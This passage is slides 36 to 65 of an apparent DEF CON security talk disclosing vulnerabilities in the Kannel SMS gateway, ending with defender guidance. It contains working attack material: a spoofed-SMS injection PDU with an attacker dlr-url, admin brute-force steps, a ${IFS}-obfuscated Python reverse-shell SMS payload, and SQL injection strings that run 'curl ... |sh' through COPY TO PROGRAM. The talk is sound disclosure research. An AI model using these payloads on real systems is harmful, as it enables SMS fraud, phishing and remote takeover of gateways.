`gw/bb_boxc.c — boxc_receiver()        (:301) while (conn->alive) {        // no login, no auth ▸ Box port :13001 — smsbox/sqlbox/opensmppbox msg = read_from_box(conn); // :311 raw box PDU attach here if (msg_type(msg) == sms) {// :330 TYPE check only` **`deliver_sms_to_queue(msg,conn); // :334 ->SMSC NOW`** `▸ No password in the box protocol (CWE-284) if (conn->routable == 0) conn->routable = 1;    // :337 set AFTER deliver ▸ SMS routed on first read — before any } identify else if (cmd_identify) {...}// :379 identify OPTIONAL ▸ box-allow-ip is the only gate, default = } allow all // NOTE: 'routable' is NOT an auth gate - ▸ 'routable' is NOT a security check - it's //   it is set only AFTER the SMS above is sent, set AFTER the SMS is already delivered, and //   and only lets replies route BACK to this box. only decides whether replies route back to this box.` ➢ **`THE BUG —`** `routed to the SMSC before any identify — no auth gate` **`CVSS 9.8 · stock 1.5.0 · the only real barrier is a firewall.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
36 / 65
```

## Slide 37

```
> 5.1b · Unauthenticated SMS Injection· exploitation
```

##### **`Inject SMS As Anyone`**

```
1) TCP connect  bearerbox:13001    (no auth)
2) send ONE box PDU, skip cmd_identify:▸Spoof any sender —phish as a bank /
[len][ msg_type= 2 (sms) ]
government
sender   = "YourBank"    <-spoofed
receiver = +30698XXXXXX  <-target/premium
▸Mass injection + premium-rate billing
msgdata= "Your code is 000000"
fraud
dlr-url= http://attacker/leak  (optional)
3) bearerbox-> deliver_sms_to_queue-> SMSC -> phone
▸dlr-url-> exfiltrate delivery
4) read ack  —accepted, no creds ever sent
metadata
on the wire -one length-prefixed PDU:
▸Flood -> SMSC queue exhaustion (DoS)
00 00 00 30 = len(48)   00 00 00 02 = msg_typesms
00 00 00 08 Y o u r B a n k     sender (len+bytes)▸One TCP connection, one PDU -no rate
00 00 00 0C + 3 0 6 9 8 ...      receiverlimit at the protocol level.
FF FF FF FF = udhNULL   [len]"Your code.." msgdata
... + ~30 packed int fields (big-endian)
```

###### **`Binary box protocol, not HTTP. PoC: the box-injection PoC.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
37 / 65
```

## Slide 38

```
> 5.1c · video demo
```

##### **`Demo — SMS Injection`**

```
Stock Kannel 1.5.0. No credentials. One TCP connection.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
38 / 65
```

## Slide 39

```
> 5.2 · how it works
```

###### **`Admin Login Weakness — How It Works`**

```
The admin login leaks its own password through time —and can't count failures.
```

- `Password compared with memcmp — not constant-time`

- `(timing leak)`

```
attackeradmin :13000
```

   - `| guess pw ------>| Password checked byte-by-byte; it stops at the first wrong one, so a correct guess answers slightly slower (a timing leak).`

- `| <-- Denied -----| sleep += 1s   (one shared timer)`

   - `| /status(mon pw)->| sleep = 0     <- reset the timer`

   - `Brute-force backoff is one shared variable, beaten`

   - `by concurrency`

   - `A successful monitoring login zeroes that timer`

   - `▸ Low-priv monitoring credential -> full admin, char by char`

- `| guess again --->| ...now instant`

- `Bottom line: the timing read is NOT practical over`

- `LAN or the internet (25ns vs jitter) - only the nolockout + reset bug actually works.`

   - **`~25ns`** `per correct char - swamped by jitter on LAN AND the internet; not a practical remote read`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
39 / 65
```

## Slide 40

```
> 5.2a · Timing Vulnerability· source
```

##### **`Admin Login: Timing + Backoff Bypass`**

`gw/bb_http.c — httpd_check_authorization() static double sleep = 0.01;      // :101 shared, no mutex ...` **`if (octstr_compare(pw, ha_password)!=0) // :112`** `goto denied;   // octstr_compare = memcmp (NOT const-time) sleep = 0.0;       // :120 ANY success resets the timer denied: gwthread_sleep(sleep);  // :123 delay grows... sleep += 1.0;           // :124 ...+1s per wrong guess // RESET BUG (the one that works, any network): //  sleep=0.0 on ANY success (:120); /status & //  /store-status share it + take a low-priv //  status-password -> badge in -> backoff zeroed.` ➢ **`THE BUG —`** `memcmp: quits on first wrong byte -> timing leak`

- `memcmp timing leak ~25ns/char (CWE-208) -`

- `real in code, NOT extractable over LAN/internet`

- `The slowdown is ONE shared variable (CWE-`

- `307), not per-user - so a burst of guesses beats it.`

- `Any successful /status or /store-status`

- `login sets that variable back to 0.`

- `Reset it with the low-priv monitoring`

- `password, then guess the admin password at full speed.`

```
Three flaws, one function: (timing) + (race/no-lockout).
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
40 / 65
```

## Slide 41

```
> 5.2b · Timing Vulnerability · exploitation
```

##### **`Read the Admin Password, Char by Char`**

```
# per character:
```

```
curl '.../status?password=<status-pw>'   # reset timer=0
curl '.../log-level?password=<prefix+c+XX>' # timed guess
# slowest of a-z0-9A-Z = the next correct char
```

   - `Full admin pw -> shutdown / reroute the`

   - `gateway`

   - `No lockout: ~1,600 guesses/sec confirmed`

- `# burst mode (no status-pw needed): #   fire all candidates at once -> shared delay cancels,`

- `#   last-to-return = correct char  (also beats backoff)`

- `# THE RESET is the real exploit (any network):`

   - `HONEST LIMIT: the ~25ns signal is NOT`

   - `extractable over LAN or the internet.`

   - `Even on a LAN, us-ms jitter buries 25ns -`

   - `timing extraction is not doable remotely.`

- `#   any /status success -> backoff = 0 -> keep guessing`

- `#   needs a status-password (monitoring cred);`

- `#   a wide-open /status does NOT reset (no login recorded )`

```
The reset + no-lockout works over any network; the timing read is not doable over LAN or internet.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
41 / 65
```

## Slide 42

```
> §6 · remote code execution
```

## **`From the Trust Boundary to a Shell`**

```
Modern Kannel's parser held —so we attacked the trust model & the database andgot shells.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
42 / 65
```

## Slide 43

```
> 6.1 · how it works
```

###### **`SMS-to-Shell — How It Works`**

```
When the gateway runs a program per SMS, the SMS becomes the command.
```

- `An exec= sms-service runs a shell command per`

- `matching SMS`

```
phone/MO -> smsboxkeyword -> exec = /bin/echo %S
```

```
|  %S = raw SMS body
v
popen("...") -> /bin/sh-c
v
shell
```

```
e.g.  SMS body:  c ;python3 -c '<revshell>'
keyword 'c' matches -> %S = the rest of the message
cmd= /bin/echo ;python3 -c '<revshell>'
/bin/sh-c: echo (harmless) ; then the attacker's code
```

- `%S / %a / %p splice the raw message into that`

- `command`

```
▸No escaping -> shell metacharacters execute
(${IFS} beats filter)
```

- `Config-dependent: only deployments using exec=`

- `(not get-url)`

- `Triggered by any matching MO SMS - from a rogue`

- `SMSC OR a real phone.`

- `Keyword = the SMS's first word — usually public or`

- `guessable (rarely a real barrier).`

```
exec=the feature that turns a text message
into /bin/sh-c
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
43 / 65
```

## Slide 44

```
> 6.1a · POPEN Vulnerability· source
```

##### **`SMS Content -> popen()`**

`gw/urltrans.c — fill_escape_codes()      (:613) ▸ exec= sms-service builds a shell cmd from case 'S':                  // %S = raw SMS body raw SMS (%S/%a/%p) octstr_append(result, msg->sms.msgdata);  // NO escaping ▸ popen() -> /bin/sh -c, no metachar escaping gw/smsbox.c (:1273) (CWE-78)` **`f = popen(octstr_get_cstr(cmd), "r"); // -> /bin/sh -c`** `▸ check_num_args() only blocks spaces -> // %S copies the RAW SMS body into the command - unescaped; bypass with ${IFS} // popen() hands the whole string to /bin/sh -c, so any // ; | $() ${IFS} in the SMS is executed by the shell. ▸ Send an SMS, get a shell ▸ Two files, one chain: urltrans.c builds the string, smsbox.c popen()s it.` ➢ **`THE BUG —`** `attacker SMS -> /bin/sh -c, unescaped`

###### **`Config-dependent: needs exec not get-url.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
44 / 65
```

## Slide 45

```
> 6.1f · video demo
```

##### **`Demo — Send an SMS, Get a Shell`**

```
The cleanest RCE: a text message becomes /bin/sh -c.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
45 / 65
```

## Slide 46

```
> 6.1b · SMS 2 Shell· sms→ shell
```

##### **`From a Mobile SMS to a Shell — Step by Step`**

```
(1) attacker phone / rogue SMSC sends an MO SMS:
text = cmdi;python3${IFS}-c${IFS}'<revshell>'
▸Trigger is an inbound (MO) text —from
(2) carrier  ->  Kannel bearerbox(deliver_sm)
a handset or a rogue SMSC.
```

```
(3) bearerbox-> smsbox; keyword 'cmdi' matches a
sms-service with  exec = /bin/echo %S
```

- `${IFS} stands in for spaces, so`

- `check_num_args() lets it through. ▸ popen runs the whole string via /bin/sh — ';' chains the attacker's command.`

```
(4) %S substitution —raw SMS spliced in, UNescaped:
cmd= /bin/echo cmdi; python3 -c '<revshell>'
```

```
(5) popen(cmd) -> /bin/sh-c : echo runs, then ';'
starts the attacker's python reverse shell
```

```
(6) attacker gets a PTY shell as the Kannel user
```

- ➢ **`THE BUG —`** `popen runs the whole string via /bin/sh — ';' executes the attacker's command`

- `No memory bug, no exploit-dev — a text`

- `message becomes a shell.`

```
Config-gated: needs an exec= sms-service. Confirmed live on stock 1.5.0 (uid=1000).
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
46 / 65
```

## Slide 47

```
> 6.1c · SMS 2 Shell· the escapes
```

##### **`Three Things You Have to Escape`**

|`1) SPACE FILTER   check_num_args() counts space-words`
|`▸checknumargssplits on space/tab/newline`|
|---|---|
|`a space  ->  ${IFS}   (whitespace, not a 0x20)`
**`python3 -c    becomes    python3${IFS}-c`**|`__ `
`— but NOT on ${IFS}.`|
|`2) PYTHON IMPORT  import socket needs a space`
`import socket  ->  __import__("socket")`|`▸${IFS} passes the filter, then the shell`
`expands it to whitespace.`|
|`a builtin function — no keyword, no space`|`▸__import__() replaces import X so the`|
|`3) QUOTES/SYNTAX  the payload sits in the template`|`Python needs no spaces.`|
|`;  chains commands · the python is single-quoted`
`/bin/echo cmdi ; python3 -c <revshell>`|`▸; separates the harmless echo from the`
`attacker's command.`|
|**`Three small escapes turn a space-filtered field into arbitrary shell.`**
➢**`THE BUG —`** `${IFS}: one word to the filter, whitespace to the shell`||

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
47 / 65
```

## Slide 48

```
> 6.1d · SMS 2 Shell· build & deliver
```

##### **`Building & Delivering the Payload`**

```
clean revshell(spaces + import keywords):
import socket; s=socket.socket(); s.connect(..)
import os; os.dup2(..); import pty; pty.spawn('sh')
```

```
spaceless + no keywords:
s=__import__("socket").socket();s.connect(("IP",4444));
__import__("os").dup2(..);__import__("pty").spawn("sh")
```

```
wrapped for exec (${IFS}=spaces) —232 bytes, 1 SMS:
```

```
cmdi;python3${IFS}-c${IFS}'<spaceless code>'
```

- `232 bytes — fits in a single SMS.`

- `Kannel is set to connect OUT to the`

- `rogue SMSC (smsc=smpp, transceiver).`

- `One inbound deliver_sm with keyword`

- `cmdi triggers the exec service. ▸ Shell lands as uid=1000 (an SSH reverse tunnel catches it in the lab).`

```
deliver: rogue SMSC :2775 -> Kannel binds out -> 1 deliver_sm
```

```
Clean Python -> spaceless -> ${IFS}-wrapped -> one SMS -> shell. Stock 1.5.0.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
48 / 65
```

## Slide 49

```
> 6.1e · SMS 2 Shell· exploitation
```

##### **`One SMS -> Reverse Shell`**

```
sms-service:  exec = /bin/echo %S   (vulnerable config)
```

- `${IFS} = shell space -> slips past the`

- `space filter`

```
payload (spaceless, one SMS):
```

```
cmdi;python3${IFS}-c${IFS}'<socket->pty.spawn("sh")>’
```

- `Full interactive PTY as the Kannel`

- `user (root if run as root)`

- `Confirmed live on stock 1.5.0`

- `(uid=1000)`

```
delivery: rogue SMSC sends deliver_sm(MO)
```

   - `PoC: the SMS-to-shell PoC (rogue SMSC`

   - `:2775)`

- `-> smsbox keyword 'cmdi' -> exec -> popen -> revshell`

```
Anchor RCE: no memory bug, no DB. SMS in -> shell out.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
49 / 65
```

## Slide 50

```
> 6.1h · the lab in plain English
```

###### **`The Lab, in Plain English`**

```
Every part of a real mobile network —rebuilt in software, on one machine.
```

```
THE REAL WORLD            →    WHAT WE RAN
─────────────────────────────────────────────────────────────
your phone               →    OsmocomBB"mobile"types & sends the SMS
the radio / airwaves     →    a virtual cablesame bits —no RF
the cell tower           →    osmo-bts-virtual
the network switchboard  →    osmo-bsc+ osmo-mscroutes the message
the subscriber database  →    osmo-hlrknows the SIM
the carrier's SMS centre→    built into osmo-mschands SMS to apps
the SMS gateway          →    Kannel   ← the target
```

```
It all runs on one virtual machine. The only faked part is the radio —and it changes zero bytesof the message.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
50 / 65
```

## Slide 51

```
> 6.1i · full GSM origination
```

###### **`Not a Rogue SMSC — a Real Phone`**

```
We rebuilt the demo as a full virtual GSM network: the SMS is typed on an actual handset stack and rides the
real radio → core → SMPP path.
```

```
[ OsmocomBBvirtphy+ mobile ]the "phone"
|  virtual Um (GSMTAP/UDP)
v
```

```
osmo-bts-virtualBTS
|  Abis/IP
v
```

```
osmo-bsc--(M3UA)--osmo-stp
```

```
> Same RCE —proven from genuine GSM origination, not
byte-injection
```

```
> osmo-mscIS the SMSC; Kannel binds as an ESME on SMPP
:2775
```

```
> Every hop is real signalling—capturable in Wireshark
(GSMTAP)
> Threat: a malicious subscriber, not just a rogue
carrier
```

```
|  A-interface
```

```
v
```

```
osmo-msc--GSUP--osmo-hlrMSC = SMSC
|  SMPP deliver_sm(MO)
v
```

```
KannelESME · default-route
|  exec = /bin/echo %S
v
```

```
popen() -> /bin/sh-> SHELL
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
51 / 65
```

## Slide 52

```
> 6.1j · GSM-7 vs ASCII
```

###### **`Why a Phone's  _  Isn't a Computer's  _`**

```
SMS uses a different alphabet code than computers. Most letters match —a few don't.
```

```
character           phone-code (GSM-7)     computer-code (ASCII)
──────────────────────────────────────────────────────────────
_  underscore             17                    95        ← different!
$  dollar                  2                    36
{ } [ ] | ~          two bytes (escape)     one byte
Our payload is built from  _   {   }   $—exactly the mismatched ones.
```

```
Two languages that share an alphabet but spell a few letters differently. Use the wrong one and the message turns to
gibberish.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
52 / 65
```

## Slide 53

```
> 6.1k · the encoding trap
```

###### **`Surviving GSM-7 — The Charset Trap`**

```
A real phone doesn't send ASCII. GSM 03.38puts  _ { } $  at different code points —and the payload is built
from exactly those.
```

```
> _is 0x11in GSM-7 (0x5F in ASCII); { } | ~are 2-
byte escapes
```

```
> osmo-msctagged GSM-7 bytes as data_coding=1(ASCII)
→
```

```
Kannel never transcoded → __import__and ${IFS}
```

```
corrupted
```

```
> Fix: esmedcs-transparent→ data_coding=0→
```

```
Kannel's default GSM-7 → UTF-8 conversion runs
```

- `Matches prod: real gateways rely on the same default`

```
(no alt-charset)
```

```
The injection PoC hides this —it ships raw ASCII. Only a real handset exercises the encoding layer, and that's
where payloads break.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
53 / 65
```

## Slide 54

```
> 6.1l · live demo
```

###### **`A Phone Sends a Text, a Shell Opens`**

```
sms-service:  exec = /bin/echo %S
```

```
the exact SMS sent from the handset (159 septets, one segment):
c ;python3${IFS}-c'
s=__import__("socket").socket();
s.connect(("127.0.0.1",4444));
o=__import__("os");o.dup2(s.fileno(),0);
o.dup2(s.fileno(),1);o.system("sh")'
```

- `__import__ = no spaces in Python (${IFS} only expands in the shell)`

- `Must fit one segment — OsmocomBB mobile truncates at 160 septets`

- `Shell as uid=1000 — the operator typed nothing`

```
Typed on a handset.
Executed on the gateway.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
54 / 65
```

## Slide 55

```
> 6.1g · expectation vs reality
```

###### **`What We Actually Proved`**

###### **`WHAT PEOPLE EXPECT`**

###### **`WHAT WE PROVED`**

```
Attacker machineVirtual handset
|  SMPP / TCP|  GSM air interface (SDCCH/LAPDm)
vv
bearerbox→ smsboxexec=BTS → BSC → MSC
v|  SMPP deliver_sm(MO)
shellv
Kannel exec=→ shell
```

```
Direct SMPP injection —you're already inside the operator's net or
hold SMSC creds.
```

```
Payload crossed a real GSM stack: GSM-7 encoded → air interface → MSC
decodes → SMPP → popen().
```

```
Far more dangerous: only a phone + the keyword. No SMPP creds, no operator-network access —the attack surface is any
subscriberwho can reach the short code. Encoding survives: ${IFS} $ { } round-trip (dcs-transparent).
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
55 / 65
```

## Slide 56

```
> 6.2 · how it works
```

###### **`DLR SQLi -> RCE — How It Works`**

```
A delivery receipt the gateway trusts becomes a SQL query —then a shell.
```

- `DB-backed DLR stores receipt fields by`

- `pasting into SQL`

```
dlr-url(client)  -+
```

```
+-> dlr_pgsqlINSERT/SELECT ('%s') no escaping
message_id(SMSC) -+        |  '; COPY ... TO PROGRAM 'cmd'
```

- `Two untrusted inputs: dlr-url (client)`

- `and message_id (SMSC)`

- `Stacked query + COPY TO PROGRAM = OS`

- `command execution`

```
v
```

```
PostgreSQL -> /bin/sh-c -> shell (postgres)
```

- `Hits HA/production gateways (shared`

- `DB-backed DLR)`

```
COPYTO PROGRAM —PostgreSQL's built-in path
to /bin/sh
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
56 / 65
```

## Slide 57

```
> 6.2a · DLR PgSQL Injection· source
```

##### **`DLR PgSQL Injection -> COPY TO PROGRAM`**

```
gw/dlr_pgsql.c—dlr_pgsql_add()         (:144)
sql= octstr_format(
"INSERT INTO ... VALUES ('%s', ... '%s');",
..., octstr_get_cstr(entry->url), ...); // dlr-url, NO esc
gw/dlr_pgsql.c—dlr_pgsql_get()         (:176)
"... WHERE ts='%S' ..."  // SMSC message_id, NO esc
```

- `Raw '%s' interpolation — no`

- `PQescape/PQexecParams (CWE-89)`

- `PQexec runs stacked statements ( ; ...`

- `) ▸ COPY ... TO PROGRAM -> /bin/sh -c -> RCE as postgres`

➢ **`THE BUG —`** `attacker value pasted into SQL, unescaped`

- `Two inputs: dlr-url (client) AND`

- `message_id (SMSC)`

```
PgSQL/MSSQL backends only; the MySQL backend escapes.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
57 / 65
```

## Slide 58

```
> 6.2b · DLR PgSQL Injection· two paths
```

##### **`Client Path vs Trust-Boundary Path`**

```
PATH 1 —client / sendsms
field : dlr-urlHTTP parameter
who   : anyone with sendsmscreds (often admin:admin)
status: confirmed shell as postgres
```

```
▸PATH 2: hostile upstream -> shell, no
login on the gateway
▸Fires even with 0 DLR rows (PQexec
runs all statements)
```

```
PATH 2 —SMSC message_id<--THE THESIS
field : receipted_message_idTLV in a delivery receipt
who   : rogue / MitM upstream SMSC —NO gateway creds
status: confirmed revshell, uid=110(postgres)
```

```
▸TLV capped 64 chars -> stage revshell
over HTTP (curl|sh)
```

```
▸DB role needs SUPERUSER for program-
exec
```

```
DB-backed DLR = the signature of HA / billing-grade deployments.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
58 / 65
```

## Slide 59

```
> 6.2c · DLR PgSQL Injection· exploitation
```

##### **`The COPY TO PROGRAM Payload`**

```
PATH 1 (dlr-url):
...&dlr-url=http://x/'; COPY (SELECT '') TO
PROGRAM 'id>/tmp/pwned'; --
PATH 2 (message_idTLV, 62 chars):
'; COPY (SELECT '') TO PROGRAM
'curl 127.0.0.1:9998/s|sh'; --
```

- `Single quote breaks out -> ; stacks ->`

- `COPY runs the OS cmd`

- `-- comments out the rest of Kannel's`

- `query`

- `PATH 2: Kannel auto-binds rogue SMSC -`

- `1 deliver_sm -> shell`

- `Scope: Changed — code runs on the`

- `PgSQL host`

```
The thesis RCE: a hostile carrier's receipt becomes code execution.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
59 / 65
```

## Slide 60

```
> 6.2d · video demo
```

##### **`Demo — Hostile Upstream -> Shell`**

```
expected: uid=110(postgres) —operator typed nothing
PATH 1: one curl -> /tmp/pwned contains id output
```

```
From the SMSC trust boundary to a shell on the gateway.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
60 / 65
```

## Slide 61

- `6.3 · legacy memory corruption`

##### **`The Old Way In`**

```
Every protocol ships in the binary —even the ones you'll never use.
```

- `Kannel compiles EVERY SMSC driver into one binary — SMPP, CIMD, OIS, UCP — used or not.`

- `You'll almost never meet a CIMD or OIS carrier in 2026 (legacy Nokia-era) — but the vulnerable code still ships in`

- `every build.`

- `So the bug is real, just rarely reachable: needs that legacy SMSC configured AND a build with modern stack`

- `protections off.`

- `Unhardened builds aren't rare where it counts: long-lived EOL OSes (CentOS 6/7), Kannel built from source with no PIE/canary — nobody rebuilds an EOL box.`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
61 / 65
```

## Slide 62

```
> 6.3a · CIMD (legacy)
```

##### **`CIMD Stack Overflow -> ret2libc`**

```
gw/smsc/smsc_cimd.c—cimd_submit_msg()   (:362)▸Fake smsbox-> box port :13001 (no
auth) injects oversized SMS
char msgtext[1024];          // fixed stack buffer
▸Triggers only if max-sms-octets > 1024
octstr_get_many_chars(msgtext,
```

- `Triggers only if max-sms-octets > 1024`

- `(else split = safe)`

```
msg->sms.msgdata, 0, len);  // :395 NO bounds check▸ASAN: stack-buffer-overflow CONFIRMED
on stock 1.5.0
```

```
// 1100-byte msgdata-> 1100 bytes into msgtext[1024]
```

- ➢ **`THE BUG —`** `1100 bytes into a 1024 buffer, no bounds check`

- `Full RCE: ret2libc -> system("id") as`

- `bearerbox uid=1000`

```
Crash confirmed on stock; shell needs -fno-stack-protector / no-PIE build.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
62 / 65
```

## Slide 63

```
> 6.3b · OIS (legacy)
```

##### **`OIS memcpy Stack Overflow`**

```
gw/smsc/smsc_ois.c—ois_extract_msg_from_buffer()
char buffer[BUFLEN+1];     // :646  (512 bytes)
```

- `// SUCCESS path (:1617) — NO bounds check:`

- **`memcpy(str, smsc->buffer, len);  // len can exceed 512`**

- `// ERROR path (:1626) — correctly caps len at BUFLEN (!)`

   - `Devs capped len in the error path —`

   - `forgot the success path`

- ➢ **`THE BUG —`** `memcpy with no bounds check (success path)`

- `Crafted OIS message > 512 bytes`

- `overflows the stack buffer`

- `Needs an OIS SMSC configured (rare,`

- `legacy Nokia gear)`

- `Reverse shell achieved on a no-canary`

- `build`

```
Bug is real & still in the code; exploitation needs legacy protocol + no canary.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
63 / 65
```

## Slide 64

```
> 4.7 · defensive guidance
```

##### **`What Defenders Can Do (Today)`**

###### **`NETWORK / ARCHITECTURE`**

###### **`APPLICATION LEVEL`**

- `Never expose the SMSC port (2775) to untrusted nets`

   - `Never use DLR callbacks as the sole MFA gate`

- `Mutual TLS + pinned certs on SMSC links`

   - `Alert on missing DLR within the expected window`

- `Per-tenant SMPP credentials → limit blast radius`

   - `Sign messages app Kannel admin API`

- `Alert on anomalous generic_nack rates`

- `PostgreSQL DLR backend: run as non-superuser`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
64 / 65
```

## Slide 65

```
DEF CON 34 · LOGGED IN
```

# **`THANK YOU`**

```
There are some honorable mentions:
```

```
root@defcon:~/sms-gw$ ./Euxaristo--target kannel--mode offensive _
```

```
▸Anna Manousaki . . . . . . . . .  Thank you, Mentor
▸Konstantinos Stroubakis . . . .   The guy that knows SMS and SMPP
```

```
▸Giannis Terzakis . . . . . . . .  Thanks for everything
▸Lucas Lundgren . . . . . . . . .  Thanks for helping out
```

```
▸George Sotiriadis . . . . . . . . Souvlaki brother 1
```

```
▸Nikos Katsiopis . . . . . . . . . Souvlaki brother 2
```

```
▸Vasilis Maritsas . . . . . . . .  Always there
```

```
▸Vincent Yiu . . . . . . . . . . . The Asian Stallion
```

```
▸Vagelis Mitakidis . . . . . . . . The Red Team Guy
▸Dimitris Siatiras . . . . . . . . The Greek Stallion
```

```
▸Pipe Rodanant. . . . . . . . . .  Life Changer
```
